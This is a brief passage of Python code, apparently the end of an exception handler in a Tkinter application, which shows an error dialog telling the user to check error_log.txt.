            pass
        
        # Display error message
        messagebox.showerror(APPLICATION_NAME, f"A fatal error occurred: {str(e)}\n\nCheck error_log.txt for details.")
